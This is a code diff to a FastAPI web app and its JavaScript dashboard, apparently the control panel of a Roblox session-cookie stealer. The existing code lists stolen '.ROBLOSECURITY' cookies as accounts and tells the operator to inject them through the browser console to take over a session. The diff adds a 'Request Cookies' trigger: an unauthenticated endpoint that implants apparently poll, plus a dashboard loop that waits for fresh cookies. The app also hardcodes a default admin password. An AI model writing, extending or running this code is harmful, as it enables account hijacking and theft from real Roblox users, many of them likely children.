@@ -8,6 +8,7 @@ app = FastAPI()
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "bucrf1212")
 SESSIONS = {}
 PROFILE = {"username": "Admin", "avatar": "", "bio": ""}
+COOKIE_TRIGGER = False
 
 # ─── MongoDB (или файл, если MongoDB нет) ───
 MONGO_URL = os.environ.get("MONGO_URL")
@@ -143,6 +144,20 @@ async def save_settings(request: Request, session=Depends(require_session)):
     if "avatar" in body: PROFILE["avatar"] = body["avatar"]
     if "bio" in body: PROFILE["bio"] = body["bio"]
     return {"ok": True}
+
+@app.post("/api/trigger-cookies")
+async def trigger_cookies(session=Depends(require_session)):
+    global COOKIE_TRIGGER
+    COOKIE_TRIGGER = True
+    return {"ok": True}
+
+@app.get("/api/trigger-check")
+async def trigger_check():
+    global COOKIE_TRIGGER
+    if COOKIE_TRIGGER:
+        COOKIE_TRIGGER = False
+        return {"trigger": True}
+    return {"trigger": False}
 
 @app.get("/api/settings")
 async def get_settings(session=Depends(require_session)):
@@ -292,6 +307,7 @@ function renderDashboard() {
         </div>
         <div class="header-actions">
           <span>${state.cookies.length} accounts</span>
+          <button class="btn btn-primary btn-sm" onclick="requestCookies()">📥 Request Cookies</button>
           <button class="btn btn-outline btn-sm" onclick="refreshCookies()">🔄 Refresh</button>
           <button class="btn btn-outline btn-sm" onclick="openSettings()">⚙ Settings</button>
           <button class="logout-btn" onclick="logout()">Logout</button>
@@ -375,6 +391,35 @@ function loginToRoblox(cookie) {
     setTimeout(() => {
         alert('Cookie copied!\n\n1. Open Roblox (already opened)\n2. Press F12 → Console\n3. Paste this and press Enter:\n\ndocument.cookie=".ROBLOSECURITY=' + cookie + '; path=/; domain=.roblox.com"\n\n4. Refresh the page (F5)');
     }, 1000);
+}
+
+async function requestCookies() {
+    const btn = event.target;
+    btn.textContent = '⏳ Waiting...';
+    btn.disabled = true;
+    const r = await api('POST', '/api/trigger-cookies');
+    if (r) {
+        let waited = 0;
+        const check = setInterval(async () => {
+            const c = await api('GET', '/api/cookies');
+            if (c && c.length > state.cookies.length) {
+                state.cookies = c;
+                renderCards();
+                btn.textContent = '📥 Request Cookies';
+                btn.disabled = false;
+                clearInterval(check);
+            }
+            waited += 3;
+            if (waited > 60) {
+                btn.textContent = '📥 Request Cookies';
+                btn.disabled = false;
+                clearInterval(check);
+            }
+        }, 3000);
+    } else {
+        btn.textContent = '📥 Request Cookies';
+        btn.disabled = false;
+    }
 }
 
 async function refreshCookies() {
